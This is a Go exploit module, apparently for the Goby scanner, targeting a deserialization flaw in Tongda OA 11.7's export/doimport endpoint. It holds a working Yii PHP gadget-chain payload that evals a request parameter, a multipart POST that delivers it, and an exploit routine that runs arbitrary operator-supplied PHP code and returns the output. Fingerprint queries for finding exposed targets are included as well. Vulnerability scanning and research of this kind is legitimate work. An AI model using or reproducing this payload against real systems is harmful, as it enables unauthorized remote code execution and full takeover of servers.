package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "TongdaOA 11.7 export/Doimport method code execution Vulnerability",
    "Description": "<p>Tongda OA office system is a simple and practical collaborative office OA system developed by Beijing Tongda Xinke Technology Co., Ltd.</p><p>There is a deserialization vulnerability in the frm_file parameter of the export/Doimport method of Tongda OA 11.7 version. Combined with the exploit chain of code execution, server permissions can be directly obtained.</p>",
    "Product": "TongdaOA",
    "Homepage": "https://www.tongda2000.com/",
    "DisclosureDate": "2022-08-10",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": "body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\"",
    "GobyQuery": "body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\"",
    "Level": "3",
    "Impact": "<p>There is a deserialization vulnerability in the frm_file parameter of the export/Doimport method of Tongda OA 11.7 version. Combined with the exploit chain of code execution, server permissions can be directly obtained.</p>",
    "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version of 11.x or 12.x (not fixed in 2017): <a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2. Deploy a Web application firewall to monitor database operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
    "References": [
        "https://www.tongda2000.com/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "code",
            "type": "input",
            "value": "echo \"123456\";",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|202cb962ac59075b964b07152d234b70([\\w\\W]+)202cb962ac59075b964b07152d234b70"
            ]
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "通达 oa 11.7 export/Doimport 方法代码执行漏洞",
            "Product": "通达oa",
            "Description": "<p>通达OA办公系统是由<span style=\"color: rgb(62, 62, 62);\">北京通达信科科技有限公司开发的一款<span style=\"color: rgb(62, 62, 62);\">简洁实用的协同办公OA系统。</span></span></p><p><font color=\"#3e3e3e\">通达OA 11.7版本的<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">export/Doimport</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\"></span><span style=\"color: rgb(62, 62, 62); font-size: 16px;\"></span><span style=\"font-size: 16px; color: rgb(22, 28, 37);\"></span>方法的frm_file参数存在反序列化漏洞，结合代码执行的利用链，可以直接获取服务器权限。</font><span style=\"color: rgb(62, 62, 62);\"><span style=\"color: rgb(62, 62, 62);\"><br></span></span></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户升级至11.x或者12.x最新版（2017未修复）：<a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(62, 62, 62); font-size: 16px;\">通达OA 11.7版本的</span><span style=\"font-size: 16px; color: rgb(22, 28, 37);\">export/Doimport</span><span style=\"color: rgb(62, 62, 62); font-size: 16px;\">方法的</span><span style=\"color: rgb(62, 62, 62); font-size: 16px;\">frm_file</span><span style=\"color: rgb(62, 62, 62); font-size: 16px;\">参数存在反序列化漏洞，结合代码执行的利用链，可以直接获取服务器权限。</span><br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "TongdaOA 11.7 export/Doimport method code execution Vulnerability",
            "Product": "TongdaOA",
            "Description": "<p>Tongda OA office system is a simple and practical collaborative office OA system developed by Beijing Tongda Xinke Technology Co., Ltd.</p><p>There is a deserialization vulnerability in the frm_file parameter of the export/Doimport method of Tongda OA 11.7 version. Combined with the exploit chain of code execution, server permissions can be directly obtained.<br></p>",
            "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version of 11.x or 12.x (not fixed in 2017): <a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2. Deploy a Web application firewall to monitor database operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
            "Impact": "<p>There is a deserialization vulnerability in the frm_file parameter of the export/Doimport method of Tongda OA 11.7 version. Combined with the exploit chain of code execution, server permissions can be directly obtained.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10708"
}`

	upload_file123455 := func(u *httpclient.FixUrl, poc string) string {
		uri := "/general/appbuilder/web/appdesign/export/doimport?test=/portal/gateway/doprint"
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		pre, _ := url.QueryUnescape("O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A17%3A%22yii%5Cdb%5CConnection%22%3A2%3A%7Bs%3A26%3A%22%00yii%5Cdb%5CConnection%00_master%22%3BO%3A21%3A%22yii%5Cdi%5CServiceLocator%22%3A1%3A%7Bs%3A35%3A%22%00yii%5Cdi%5CServiceLocator%00_definitions%22%3Ba%3A1%3A%7Bs%3A3%3A%22pdo%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A15%3A%22yii%5Cbase%5CModule%22%3A1%3A%7Bs%3A25%3A%22%00yii%5Cbase%5CModule%00_version%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A32%3A%22yii%5Ccaching%5CExpressionDependency%22%3A2%3A%7Bs%3A10%3A%22expression%22%3Bs%3A23%3A%22eval%28%24_REQUEST%5B%27img%27%5D%29%3B%22%3Bs%3A8%3A%22reusable%22%3Bb%3A0%3B%7Di%3A1%3Bs%3A9%3A%22isChanged%22%3B%7D%7Di%3A1%3Bs%3A10%3A%22getVersion%22%3B%7D%7D%7Ds%3A3%3A%22pdo%22%3Bs%3A1%3A%221%22%3B%7D%7D")
		cfg.Header.Store("Referer", u.FixedHostInfo)
		cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryLx7ATxHThfk91oxQ")
		cfg.Data = "------WebKitFormBoundaryLx7ATxHThfk91oxQ\r\n"
		cfg.Data += "Content-Disposition: form-data; name=\"frm_file\"; filename=\"aaaaa.frm\"\r\n"
		cfg.Data += "Content-Type: application/octet-stream\r\n\r\n"
		cfg.Data += pre + "\r\n"
		cfg.Data += "------WebKitFormBoundaryLx7ATxHThfk91oxQ\r\n"
		cfg.Data += "Content-Disposition: form-data; name=\"img\"\r\n\r\n"
		cfg.Data += poc + "\r\n"
		cfg.Data += "------WebKitFormBoundaryLx7ATxHThfk91oxQ--"
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
			return resp.RawBody
		}
		return "error"
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			payload := "echo md5(123);exit;"
			data := upload_file123455(u, payload)
			if strings.Contains(data, "202cb962ac59075b964b07152d234b70") {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			code := ss.Params["code"].(string)
			payload := "echo md5(123);" + code + "echo md5(123);exit;"
			data := upload_file123455(expResult.HostInfo, payload)
			if strings.Contains(data, "202cb962ac59075b964b07152d234b70") {
				reg := regexp.MustCompile(`202cb962ac59075b964b07152d234b70([\w\W]+)202cb962ac59075b964b07152d234b70`)
				coreName := reg.FindStringSubmatch(data)
				expResult.Success = true
				expResult.Output = coreName[1]
			}
			return expResult
		},
	))
}
